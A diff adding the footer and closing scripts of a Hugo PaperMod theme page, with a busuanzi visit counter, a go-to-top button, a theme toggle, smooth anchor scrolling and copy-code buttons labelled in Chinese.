+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+    <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv">
+        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
+    </span>
+    <span id="busuanzi_container_site_uv">
+        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
+    </span>
+    </div></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
